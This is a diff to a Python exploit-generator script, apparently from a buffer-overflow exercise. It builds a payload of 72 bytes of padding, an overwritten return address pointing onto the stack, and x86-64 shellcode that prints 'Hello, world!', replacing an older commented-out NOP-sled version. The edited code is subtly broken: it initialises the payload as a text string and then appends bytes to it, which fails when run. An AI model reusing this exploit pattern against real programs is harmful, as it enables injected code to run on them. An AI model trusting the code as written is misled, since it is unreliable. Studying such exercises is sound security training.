@@ -41,83 +41,50 @@ if __name__ == '__main__':
 
     args = parser.parse_args()
     
-    overall_payload = b''
+    overall_payload = ''
 
-    SLED_LENGTH = 24
+    # SLED_LENGTH = 24
 
-    NOP_SLED = b'\x90' * SLED_LENGTH
+    # NOP_SLED = b'\x90' * SLED_LENGTH
     
     # command to push, call, then pop
-    BUFFER = b"\xe9\x1e\x00\x00\x00"  
-    BUFFER += b"\xb8\x04\x00\x00\x00"  
-    BUFFER += b"\xbb\x01\x00\x00\x00"  
-    BUFFER += b"\x59"                  
-    BUFFER += b"\xba\x0f\x00\x00\x00"  
-    BUFFER += b"\xcd\x80"              
-    BUFFER += b"\xb8\x01\x00\x00\x00"  
-    BUFFER += b"\xbb\x00\x00\x00\x00"  
-    BUFFER += b"\xcd\x80"              
-    BUFFER += b"\xe8\xdd\xff\xff\xff"  
-    BUFFER += bytes("Hello world!\n".encode())
+    # BUFFER = b"\xe9\x1e\x00\x00\x00"  
+    # BUFFER += b"\xb8\x04\x00\x00\x00"  
+    # BUFFER += b"\xbb\x01\x00\x00\x00"  
+    # BUFFER += b"\x59"                  
+    # BUFFER += b"\xba\x0f\x00\x00\x00"  
+    # BUFFER += b"\xcd\x80"              
+    # BUFFER += b"\xb8\x01\x00\x00\x00"  
+    # BUFFER += b"\xbb\x00\x00\x00\x00"  
+    # BUFFER += b"\xcd\x80"              
+    # BUFFER += b"\xe8\xdd\xff\xff\xff"  
+    # BUFFER += bytes("Hello world!\n".encode())
 
     # COMMAND = pack("<Q", 0x00005555555551c5)
     # COMMAND += bytes("Hello world!".encode())
     # print(len(BUFFER))
 
-    PADDING = 'X' * (72 - SLED_LENGTH - len(BUFFER))
-    print('padding len:',len(PADDING))
+    PADDING = 'X' * 72
+    # print('padding len:',len(PADDING))
     # print('buffer:', len(BUFFER))
 
-    RIP = pack("<Q", 0x555555559670)
+    # RIP = pack("<Q", 0x555555559670)
     
-    print('RIP:', len(RIP))
+    # print('RIP:', len(RIP))
 
     # In order: NOP sled, command, buffer, RIP addr to NOP sled
-    overall_payload += NOP_SLED
+    overall_payload += PADDING
+    overall_payload += pack("<Q", 0x7fffffffde00)
+    print('len until bogus:', len(overall_payload))
+    
+    overall_payload += b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'
+
     # overall_payload += COMMAND
-    overall_payload += BUFFER
-    overall_payload += bytes(PADDING.encode())
-    overall_payload += RIP
+    # overall_payload += BUFFER
+    # overall_payload += bytes(PADDING.encode())
+    # overall_payload += RIP
 
     print('length:', len(overall_payload))
-
-    # # add buffer
-    # buff = args.b
-    # if buff is None:
-    #     buff = 72
-    # overall_payload += bytes(int(buff) * 'C'.encode())
-    
-    # pop rdi?
-    # overall_payload += pack("<Q", 0x00007ffff7df705a)
-
-    # printf function here
-    # overall_payload += pack("<Q", 0x7ffff7e2d8f0)
-    
-    # overall_payload += bytes("hello world!".encode())
-
-    # after padding
-    # overall_payload += ""
-
-    # # add string
-    # to_print = args.s
-    # if args.s is not None:
-    #     overall_payload += to_print
-
-    # # add gadget address
-    # if args.g is not None:
-    #     overall_payload += str(args.g)
-
-    # # add string address
-    # if args.sa is not None:
-    #     overall_payload += str(args.sa)
-
-    # # add printf address
-    # if args.p is not None:
-    #     overall_payload += str(args.p)
-
-    # # add exit address
-    # if args.e is not None:
-    #     overall_payload += str(args.e)
 
     with open('generated.txt', 'wb') as f:
         f.write(overall_payload)
